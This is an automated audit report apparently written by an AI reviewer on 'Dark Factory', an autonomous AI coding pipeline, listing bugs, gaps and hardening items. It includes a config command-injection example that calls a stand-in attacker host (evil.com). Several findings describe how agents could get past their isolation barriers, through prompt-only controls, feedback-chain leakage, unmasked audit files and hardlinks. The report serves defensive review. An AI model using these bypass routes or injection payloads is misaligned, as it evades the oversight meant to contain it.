# Dark Factory — Critical Evaluation (v4)

**Date:** 2026-03-03
**Reviewer:** Claude Opus 4.6 (automated)
**Scope:** Full repository audit + comparison against StrongDM Software Factory architecture

---

## Overview

Dark Factory is a well-engineered specification-driven AI development framework with genuine security engineering — the Docker tmpfs masking, internal network egress filtering, and defense-in-depth layering are not theater. Three rounds of self-evaluation (v1 through v3) have identified and resolved the most severe issues. This v4 evaluation goes deeper on two axes: (1) bugs and gaps missed by prior reviews, and (2) a structural comparison against StrongDM's Software Factory — the production system that coined the "dark factory" concept — to identify the path from "good framework" to "cutting-edge autonomous pipeline."

Findings are organized into **Bugs**, **Architectural Gaps vs. StrongDM**, and **Hardening Opportunities**.

---

## Bugs (Fix These First)

### 1. Trap Handler Captures Wrong Exit Code

**Severity: Medium (crash recovery silently broken)**

**File:** `scripts/dark-factory.sh:286`

```bash
trap 'teardown_proxies; ec=$?; cleanup_containers; if [[ $ec -ne 0 ]]; then write_state "status" "interrupted" 2>/dev/null || true; fi' EXIT
```

`ec=$?` captures the exit code of `teardown_proxies`, not the signal that triggered the trap. If the pipeline fails (exit 1) but proxy teardown succeeds (exit 0), then `ec=0` and the state file is never written as "interrupted." This means crash recovery silently fails for the most common case (pipeline error + clean teardown).

**Fix:** Capture `$?` before calling `teardown_proxies`:

```bash
trap 'ec=$?; teardown_proxies; cleanup_containers; if [[ $ec -ne 0 ]]; then ...'
```

---

### 2. Config Sourcing Executes Before Metacharacter Validation

**Severity: Medium-High (command injection in config)**

**File:** `scripts/lib/config.sh:69`

`source "$file"` runs before the metacharacter check on lines 30-39 validates values. The `validate_config` function checks that lines look like variable assignments and that specific variable values don't contain `$`, `` ` ``, or `(`. However, the metacharacter check happens *after* sourcing, so the damage from command injection (e.g., `LANGUAGE=node$(curl evil.com)`) fires during `source` before the check runs.

Additionally, the metacharacter check only validates *specific named variables* — if the config file defines OTHER variables with metacharacters, those slip through entirely.

**Fix:** Validate the config file structurally *before* sourcing it. Parse with `grep`/`awk` first, then source only if all checks pass.

---

### 3. `cleanup_containers` Uses Docker Substring Matching

**Severity: Low-Medium (cross-spec container interference)**

**File:** `scripts/lib/docker.sh:66-67`

```bash
docker ps -q --filter "name=df-${SPEC_NAME:-unknown}-" 2>/dev/null | \
    xargs -r docker rm -f 2>/dev/null || true
```

Docker's `--filter "name=..."` uses substring matching by default, not prefix matching. Spec name `auth` would match containers for spec `auth-v2`, potentially killing a concurrent pipeline run's containers.

**Fix:** Use `--filter "name=^df-${SPEC_NAME}-"` (anchored regex) or append the PID suffix to the filter to narrow the match.

---

### 4. `flock` Is Unavailable on macOS (Primary Dev Platform)

**Severity: Low-Medium (no concurrency protection on macOS)**

**File:** `scripts/lib/state.sh:18`

```bash
flock -x 200 2>/dev/null || true  # Best-effort lock
```

`flock` doesn't exist on macOS by default. The `|| true` silently falls back to no locking, so the state file has zero concurrency protection on the platform most developers will use.

**Fix:** Use `shlock` on macOS as a fallback, or check for `flock` availability during `validate-setup.sh` and warn if unavailable.

---

### 5. Resume Doesn't Detect Spec Modification

**Severity: Medium (unvalidated spec enters pipeline)**

**File:** `scripts/dark-factory.sh:336-338`

When resuming, the pipeline checks `completed_step` but never compares the spec file's hash against the last run. A user could modify the spec, resume, and skip validation of the changed spec — running an unvalidated spec through the implementation phase.

**Fix:** Store a SHA-256 hash of the spec file in the state file at validation time. On resume, compare hashes and force re-validation if the spec changed.

---

### 6. `--max-iterations` Argument Missing Value Causes Unhelpful Error

**Severity: Low**

**File:** `scripts/dark-factory.sh:141-142`

```bash
--max-iterations)
    MAX_ITERATIONS="$2"
    shift 2
```

If `--max-iterations` is the last argument with no value, `$2` is unset and `set -u` aborts with a cryptic error. Same for `--test-cmd`. No `[[ $# -ge 2 ]]` guard exists.

---

### 7. `SOURCE_DIRS` Is Space-Separated, Not Array-Safe

**Severity: Low (breaks on paths with spaces)**

**File:** `scripts/lib/barriers.sh:27`, `scripts/lib/docker.sh:217`

```bash
for _dir in ${SOURCE_DIRS:-${SOURCE_DIR:-src}}; do
```

`SOURCE_DIRS` is used via unquoted word splitting. Any source directory containing spaces breaks silently. The config validation doesn't explicitly block spaces in `SOURCE_DIRS`.

---

### 8. Go Scenario Runner Targets `.dark-factory/` Path

**Severity: Low (Go scenarios silently find no tests)**

**File:** `scripts/run-scenarios.sh:96`

```bash
run_with_timeout "go test './$SCENARIOS_DIR/...' -v"
```

Go's test system ignores directories starting with `.` (like `.dark-factory`), so this command silently finds no tests. The quality-gate.sh comments acknowledge this for Go and Rust, but `run-scenarios.sh` still attempts it.

---

## Architectural Gaps (vs. StrongDM's Approach)

### 9. No Digital Twin / Ephemeral Deployment Infrastructure

**Severity: Architectural (largest capability gap)**

**The StrongDM difference:** StrongDM built a Digital Twin Universe — local replicas of Okta, Jira, Slack, Google Docs that replicate APIs, edge cases, and observable behaviors. Their evaluator agent runs HTTP requests against ephemeral deployments of the actual application, testing *real behavior* rather than unit-test assertions. They can run thousands of scenarios per hour without hitting rate limits, triggering abuse detection, or accumulating API costs.

**Dark Factory's gap:** Blind scenarios are conventional test files (`.test.ts`, `.spec.py`, `_test.go`) that run in the quality gate container. They test code structure and function calls, not deployed application behavior. There's no ephemeral deployment, no API-level integration testing, and no simulation of external dependencies.

**Why it matters:** An implementation can pass all unit/integration tests yet fail in deployment due to configuration issues, environment dependencies, race conditions under load, or API contract mismatches. StrongDM's digital twin approach catches these; conventional test suites don't. This is the single largest capability gap between Dark Factory and a StrongDM-class pipeline.

**Recommendation:** Add an optional `DEPLOY_CMD` config variable and a post-quality-gate deployment step. The Scenario Architect could generate both conventional test files AND plain-English API scenarios. An evaluator agent running against the deployed application would provide StrongDM-style behavioral validation.

---

### 10. No LLM-as-Evaluator Pattern

**Severity: Architectural (brittle test assertions)**

**The StrongDM difference:** StrongDM uses an LLM evaluator that reads plain-English scenarios and dynamically plans HTTP requests — no brittle step definitions, no fragile assertion code. The evaluator *interprets* expected behavior rather than asserting exact values. When APIs change slightly (field renamed, different JSON structure), the evaluator adapts; hardcoded assertions don't.

**Dark Factory's gap:** The Scenario Architect writes conventional test code that the Quality Gate executes mechanically. If the test code has a bug, the pipeline fails for the wrong reason. If the API contract changes slightly, tests break even if the behavior is correct.

**Recommendation:** Add an optional LLM evaluator agent that reads plain-English scenario descriptions and validates deployed behavior. This could complement (not replace) the existing conventional test approach.

---

### 11. No Cross-Spec Regression Testing

**Severity: Medium (late specs silently break early specs)**

**The StrongDM difference:** StrongDM's maintenance agents run weekly, scanning for code drift and opening cleanup PRs that go through the same scenario validation.

**Dark Factory's gap:** Each spec runs through the pipeline in isolation. After spec F-4 ships, no one re-runs spec F-1's scenarios to check for regressions. The `depends-on` field handles build order, but there's no behavioral contradiction detection between specs and no regression suite. A late spec can silently break an earlier spec's behavior.

**Recommendation:** Add a `--regression` flag to `dark-factory.sh` that re-runs all existing scenarios from previously shipped specs after a new spec is implemented. Document that shipped specs' scenarios should be re-run after later specs are completed. Consider automated contradiction detection between spec requirements.

---

### 12. No Progressive Trust / Staged Autonomy

**Severity: Architectural (all-or-nothing adoption)**

**The StrongDM difference:** StrongDM defines explicit autonomy levels:
- Phase 2: Human approval required; 90% scenario pass rate
- Phase 3: Conditional auto-merge; >90% pass rate over last 20 PRs, <5% false positive rate, <10% human override rate
- Phase 4: Full automation across all qualifying services

Each phase independently delivers value. Teams adopt gradually.

**Dark Factory's gap:** Dark Factory is binary — either the full pipeline with no human in the loop (`dark-factory.sh`), or skills with no enforcement at all. There's no "human reviews the Oracle's decision before merge" phase, no tracked pass-rate metrics over time, no false-positive tracking, and no graduated trust escalation. The jump from "conventional development" to "fully autonomous" is a cliff, not a ramp.

**Recommendation:** Add autonomy levels:
1. **Level 1 (Assisted):** Pipeline runs, human reviews Oracle decision before merge
2. **Level 2 (Supervised):** Auto-merge with human notification; tracked pass-rate metrics
3. **Level 3 (Autonomous):** Full dark factory, contingent on sustained pass rate thresholds
4. **Level 4 (Maintenance):** Automated drift detection and cleanup PR generation

---

### 13. No Linter-as-Documentation Pattern

**Severity: Low-Medium (missed efficiency multiplier)**

**The StrongDM difference:** StrongDM treats linter messages as agent instructions: instead of "Service layer depends on controller layer," they write "Service class imports from controller. Services must not depend on controllers. Move type to model package." This gives agents specific remediation guidance.

**Dark Factory's gap:** The quality gate runs whatever `LINT_CMD` the user configures, but there's no guidance on making lint output agent-friendly. Default linter messages are designed for humans reading IDE tooltips, not for AI agents interpreting failure output in an iteration loop.

**Recommendation:** Add documentation and examples for configuring agent-friendly lint rules. Provide a section in the spec template or integration guide on writing lint messages that serve as agent instructions.

---

### 14. No Agent Documentation Layer (AGENTS.md / Progressive Disclosure)

**Severity: Low-Medium (agents lack project context)**

**The StrongDM difference:** StrongDM uses AGENTS.md files with progressive disclosure — roughly 100 lines at the root, then organized subdirectories that agents navigate. They call this "the single best thing you can do for agent quality."

**Dark Factory's gap:** The Implementer agent reads the spec and the codebase. There's no structured mechanism for the target project to provide agent-readable architectural context, conventions, or patterns beyond what's in the code itself. The CLAUDE.md in the *framework* project is excellent, but there's no template or guidance for the *target* project's agent-readable documentation.

**Recommendation:** Add an `AGENTS.md` template to `templates/` and integrate it into the `integrate.sh` script. Document the progressive disclosure pattern in BEST-PRACTICES.md.

---

### 15. Skills Bypass ALL 11 Enforcement Layers

**Severity: High (false sense of security)**

**Status: Known — documented in CLAUDE.md but not prominently in skills themselves**

The skills workflow has no Docker containers, no tmpfs masks, no egress filtering, no audit logging, no resource limits, no iteration tracking, no state management, and no scenario validation. The information barrier is a prompt instruction that the LLM may or may not follow.

| Control | Pipeline (`dark-factory.sh`) | Skills |
|---------|-----|--------|
| Docker filesystem isolation (tmpfs masks) | Enforced | **Not present** |
| Read-only project mount | Enforced per role | **Not present** |
| `.git/` masking | Enforced | **Not present** |
| Egress filtering (internal networks + proxy) | Enforced | **Not present** |
| `--disallowedTools` | Enforced | **Not present** |
| `--append-system-prompt` barriers | Enforced | **Not present** |
| Audit logging | Full | **None** |
| Agent timeouts | Enforced via `timeout` + Docker | **None** |
| Resource limits (memory, CPU, PIDs) | Enforced | **None** |
| State management | Full | **None** |
| Scenario quality validation | Enforced (Step 2.5) | **None** |

A developer who exclusively uses skills (the easier path) will believe they're using a dark factory when they're actually using an honor system. The warning exists only in CLAUDE.md — the skill files themselves don't carry it prominently.

**Recommendation:** Add a prominent warning banner to the top of every skill file. Consider adding `--disallowedTools` enforcement at the `.claude/settings.local.json` level for implement and scenario-generation skills as a minimal technical barrier.

---

## Hardening Opportunities

### 16. Audit Log Doesn't Cover Oracle Feedback Files

**Severity: Medium (most likely barrier violation vector unchecked)**

The `audit_check_output` function scans agent stdout for restricted path strings, but it never scans the Oracle's feedback file (`*-feedback-iter*.md`) for scenario names or assertion messages. The Oracle's Semantic Barrier Rule is prompt-enforced only.

**Fix:** Add a post-write scan of feedback files for scenario-related keywords (scenario file names, common assertion patterns like "expected X but got Y").

---

### 17. `.dark-factory/audit/` and `.dark-factory/state/` Readable by Implementer

**Severity: Medium (unintended information channel)**

The Implementer masks `.dark-factory/scenarios/` and `.dark-factory/reports/`, but not `.dark-factory/audit/` or `.dark-factory/state/`. If a previous pipeline run logged `VIOLATION_SUSPECTED` entries mentioning scenario paths, or if state files contain oracle decisions with context, the Implementer can read them.

**Fix:** Add `.dark-factory/audit/` and `.dark-factory/state/` to the Implementer's tmpfs mask list.

---

### 18. No `.gitignore` for Runtime Artifacts

**Severity: Low-Medium (sensitive data accidentally committed)**

There is no `.gitignore` in the `.dark-factory/` directory. Running the pipeline would put audit logs (potentially containing sensitive agent output), state files, and generated reports into git's tracking.

**Fix:** Add a `.dark-factory/.gitignore` excluding `audit/`, `state/`, `reports/`, and other generated artifacts while keeping the `.gitkeep` sentinels.

---

### 19. No Rollback on Implementation Failure

**Severity: Medium (host files modified with no undo)**

The Implementer writes to the project via `:rw` bind mount, but `.git/` is masked so it can't use git. If the pipeline fails after implementation but before shipping, the modified source files persist on the host with no automatic rollback. The user must manually revert.

**Fix:** Create a git stash or branch snapshot before the Implementer runs. On pipeline failure or NO-SHIP escalation, offer to restore the snapshot.

---

### 20. No Cost Controls or Token Budget

**Severity: Low (cost explosion without alerting)**

`--max-turns 200` per agent × 3 iterations × 6 agents = potentially thousands of API calls per spec. There's no maximum token budget, no cost ceiling, and no alerting when a run is anomalously expensive. StrongDM explicitly caps at 3 retries and monitors token usage with alerts.

**Recommendation:** Add an optional `AGENT_MAX_COST_USD` config variable. Log token usage per agent to the audit file. Add cost-related alerting.

---

### 21. Stale Documentation (3 Files)

**Severity: Low (documentation inconsistency)**

- `docs/WORKFLOW.md:179` — References "scenario names" and "error messages" in Oracle feedback (pre-semantic-barrier format)
- `docs/MIGRATION.md:143` — States "Network egress is unrestricted" (egress filtering has been implemented)
- `docs/BEST-PRACTICES.md:101-103` — References old Oracle feedback format with "test names and error messages"

**Fix:** Update all three files to reflect current Oracle feedback format and egress filtering implementation.

---

### 22. `noexec` and `--read-only` Were Planned But Not Implemented

**Severity: Low (larger attack surface than necessary)**

The v2 Docker isolation plan specified `--read-only` rootfs and `noexec` on `/tmp`. Neither was implemented. Agents can write and execute arbitrary binaries anywhere in the container filesystem. Combined with `--dangerously-skip-permissions`, an agent could download and execute arbitrary code (limited by egress filtering, but still a larger surface than necessary).

**Recommendation:** Re-evaluate adding `--read-only` with explicit writable tmpfs for paths Claude Code needs (e.g., `/tmp`, `/home/agent`, npm cache). Add `noexec,nosuid` to the `/tmp` tmpfs.

---

### 23. npm/pip Transitive Dependencies Are Unresolved

**Severity: Medium (most realistic supply chain attack vector)**

**Status: Known limitation — documented in v3 Finding #9**

`npm install -g @anthropic-ai/claude-code@2.1.63` resolves transitive dependencies via semver at install time with no lockfile. A compromised transitive dependency published between builds would be silently pulled in. The same applies to pip packages (`ruff`, `mypy`, `pytest` and their transitive deps).

**Recommendation:** Generate and commit a `package-lock.json` for the global install. For pip, use `pip freeze` output or `pip-compile` to pin the full dependency tree.

---

### 24. Mask Configuration Is Procedural, Not Declarative

**Severity: Low-Medium (maintainability risk)**

Per-role masks are embedded in a bash `case` statement (`docker.sh:212-239`). Adding a new agent role requires modifying the case statement and understanding mask semantics. A missing mask silently removes a barrier with no test failure (the test suite checks for specific masks but relies on the test author remembering to add assertions when masks change).

**Recommendation:** Consider a declarative configuration (YAML/JSON or a dedicated bash associative array) that defines each role's masks. Add a test that verifies all known roles have mask definitions.

---

### 25. Reviewer Has Unmasked Access to Quality Gate Report

**Severity: Low-Medium (scenario details in reviewer → oracle → feedback chain)**

The Reviewer's masks are `.dark-factory/scenarios/` and `.git/` — but `.dark-factory/reports/` is unmasked. The quality gate report contains full test output including blind scenario assertion messages and failure details. The Reviewer is told via prompt to "share test RESULTS (pass/fail, error messages) but never test SOURCE CODE" — but the defense is prompt-level only.

If the Reviewer's output reaches the Oracle, and the Oracle writes feedback, scenario details can leak through the review → oracle → feedback → implementer chain. This is a multi-hop semantic leakage path where each hop has only prompt-level barriers.

---

### 26. Symlink Safety Check Has Limited Depth and Misses Hardlinks

**Severity: Low-Medium (barrier bypass via filesystem tricks)**

`check_symlink_safety()` in `docker.sh:111-126`:
1. Uses `max_depth=1` at the project root — deeply nested symlinks are not checked
2. Does not check hardlinks — a hardlink to a file inside `.dark-factory/scenarios/` survives the tmpfs overlay because hardlinks reference inodes, not paths
3. Uses substring matching that could produce false positives

**Recommendation:** Remove the depth limit on the project root check (with appropriate exclusions for `node_modules`). Add a hardlink detection pass that checks cross-directory hardlinks pointing into restricted areas.

---

### 27. No Disk I/O or Storage Limits on Bind Mount Writes

**Severity: Low**

There is no `--storage-opt` or `--device-write-bps` limit. An agent could fill the host disk via the `:rw` bind mount. The 4GB memory limit implicitly limits tmpfs usage, but there is no limit on bind mount writes.

---

### 28. Proxy Containers Are Global Singletons

**Severity: Low (shared state across concurrent runs)**

Proxy containers `df-analysis-proxy` and `df-execution-proxy` are global singletons with hardcoded names. Network names (`df-analysis`, `df-execution`, `df-external`) are also hardcoded. Two concurrent pipeline runs on the same Docker host share these resources. Multiple Dark Factory installations on the same host would also collide.

**Recommendation:** Namespace proxy containers and networks with a run ID or spec name to support concurrent execution.

---

## Summary Table

| # | Finding | Severity | Category | Status |
|---|---------|----------|----------|--------|
| 1 | Trap handler captures wrong exit code | Medium | Bug | **New** |
| 2 | Config sourcing before metacharacter validation | Medium-High | Bug | **New** |
| 3 | `cleanup_containers` uses Docker substring matching | Low-Medium | Bug | **New** |
| 4 | `flock` unavailable on macOS | Low-Medium | Bug | **New** |
| 5 | Resume doesn't detect spec modification | Medium | Bug | **New** |
| 6 | `--max-iterations` missing value error | Low | Bug | **New** |
| 7 | `SOURCE_DIRS` not array-safe | Low | Bug | **New** |
| 8 | Go scenario runner silently finds no tests | Low | Bug | **New** |
| 9 | No digital twin / ephemeral deployment | Architectural | Gap vs. StrongDM | **New** |
| 10 | No LLM-as-evaluator pattern | Architectural | Gap vs. StrongDM | **New** |
| 11 | No cross-spec regression testing | Medium | Gap vs. StrongDM | **New** |
| 12 | No progressive trust / staged autonomy | Architectural | Gap vs. StrongDM | **New** |
| 13 | No linter-as-documentation pattern | Low-Medium | Gap vs. StrongDM | **New** |
| 14 | No agent documentation layer (AGENTS.md) | Low-Medium | Gap vs. StrongDM | **New** |
| 15 | Skills bypass all 11 enforcement layers | High | Design | Known (v3 #10) |
| 16 | Audit log doesn't cover feedback files | Medium | Hardening | **New** |
| 17 | `audit/` and `state/` readable by Implementer | Medium | Hardening | **New** |
| 18 | No `.gitignore` for runtime artifacts | Low-Medium | Hardening | **New** |
| 19 | No rollback on implementation failure | Medium | Hardening | **New** |
| 20 | No cost controls or token budget | Low | Hardening | Known (v3 #14) |
| 21 | Stale documentation (3 files) | Low | Hardening | **New** |
| 22 | `noexec` and `--read-only` not implemented | Low | Hardening | **New** |
| 23 | npm/pip transitive deps unlocked | Medium | Hardening | Known (v3 #9) |
| 24 | Mask config is procedural, not declarative | Low-Medium | Hardening | **New** |
| 25 | Reviewer has unmasked access to QG report | Low-Medium | Hardening | **New** |
| 26 | Symlink check limited depth + no hardlink check | Low-Medium | Hardening | **New** |
| 27 | No disk I/O or storage limits | Low | Hardening | **New** |
| 28 | Proxy containers are global singletons | Low | Hardening | **New** |

---

## What Is Working Well

Credit where due — these aspects are genuinely well-engineered:

- **Docker tmpfs masking** is the correct primary control. Files physically don't exist in the container's mount namespace. This is kernel-enforced, not prompt-enforced.
- **`--internal` Docker networks + tinyproxy** provide real egress control with no bypass at the routing level.
- **Digest-pinned base images** with exact version pinning for all direct dependencies.
- **Defense-in-depth layering** (Docker → tools → prompts → audit) follows real security engineering principles.
- **Precision Analysis** (implementation divergence test) for spec validation is a genuinely clever approach to Goodhart's Law.
- **Fail-safe Oracle parsing** — unrecognized output defaults to NO-SHIP.
- **Escalation protocol** with structured human handoff and decision tree is well-defined.
- **117-test suite** covering barriers, Docker args, symlinks, config validation, and state management.
- **Scenario validation** detecting trivial assertions and empty test bodies addresses a failure mode most frameworks ignore.
- **Modular refactoring** from 1,338-line monolith to 653-line orchestrator + 9 library modules.
- **Config injection validation** is thorough with shell metacharacter detection.
- **Per-role cache volumes** preventing cache poisoning between agents.
- **Symlink safety checks** with scoped directory walking.

---

## Highest-Priority Recommendations

### Immediate Fixes (P0)
1. **Fix trap handler** — Capture `$?` before `teardown_proxies` (Finding #1)
2. **Fix config sourcing order** — Validate before sourcing (Finding #2)

### Near-Term Improvements (P1)
3. **Add spec hash to state file** — Detect modification on resume (Finding #5)
4. **Add prominent skill warnings** — Every skill file should warn about missing barriers (Finding #15)
5. **Mask `audit/` and `state/` from Implementer** — Close unintended information channel (Finding #17)
6. **Add `.gitignore`** — Prevent accidental commit of sensitive artifacts (Finding #18)
7. **Add pre-implementation rollback snapshot** — Git stash/branch before Implementer runs (Finding #19)

### Strategic Improvements (P2 — path to StrongDM-class)
8. **Ephemeral deployment testing** — Add `DEPLOY_CMD` and post-quality-gate deployment validation (Finding #9)
9. **LLM-as-evaluator** — Plain-English scenario evaluation against running applications (Finding #10)
10. **Cross-spec regression** — `--regression` flag to re-run all shipped specs' scenarios (Finding #11)
11. **Progressive trust model** — Autonomy levels with tracked metrics (Finding #12)
12. **AGENTS.md template** — Structured project documentation for agent consumption (Finding #14)

---

## Bottom Line

Dark Factory is a well-architected framework that takes information barriers seriously — the Docker-level enforcement is genuinely robust and the iterative self-evaluation process (v1→v4) shows real engineering discipline. However, it is best characterized as a **spec-driven test automation framework with agent isolation**, not yet a StrongDM-class dark factory.

The key structural gaps vs. StrongDM:
1. **Testing against test assertions, not running software** — StrongDM's digital twin universe + ephemeral deployments + LLM evaluator is a fundamentally different (and more powerful) validation model
2. **No progressive trust** — you can't gradually adopt this; it's all-or-nothing
3. **No cross-spec regression** — each spec is an island
4. **Skills are a backdoor** — the convenient path bypasses all security

The foundation is solid. The path to StrongDM-class capability is: ephemeral deployments, LLM-based evaluation, progressive trust, and cross-spec regression testing.

---

## References

- [StrongDM Software Factory Blog](https://www.strongdm.com/blog/the-strongdm-software-factory-building-software-with-ai)
- [The Dark Factory Pattern (HackerNoon)](https://hackernoon.com/the-dark-factory-pattern-moving-from-ai-assisted-to-fully-autonomous-coding)
- [Simon Willison's Coverage](https://simonwillison.net/2026/Feb/7/software-factory/)
- [Stanford Law Review: Built by Agents, Tested by Agents](https://law.stanford.edu/2026/02/08/built-by-agents-tested-by-agents-trusted-by-whom/)
